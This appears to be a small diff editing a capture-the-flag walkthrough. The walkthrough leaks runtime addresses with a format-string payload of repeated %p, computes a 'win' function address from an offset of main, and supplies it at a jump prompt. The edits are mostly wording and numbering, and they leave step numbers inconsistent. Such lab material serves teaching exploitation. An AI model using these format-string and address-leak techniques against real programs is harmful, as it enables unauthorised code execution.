@@ -353,8 +353,8 @@ win = main - 0x96
 This offset never changes.
 ```
 
-4. Leak a runtime address
-When the program asks for your name:
+3. Leak a runtime address.
+When the program asks for your name, you insert this:
 ```
 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
 ```
@@ -374,9 +374,9 @@ win = 0x58d9f1cb3400 - 0x96
 win = 0x58d9f1cb336a
 ```
 
-5.Trigger the jump
+5. Trigger the jump
 The program asks:
-enter the address to jump to: (...)
+enter the address to jump to (...)
 You provide the computed address:
 ```
 0x58d9f1cb336a
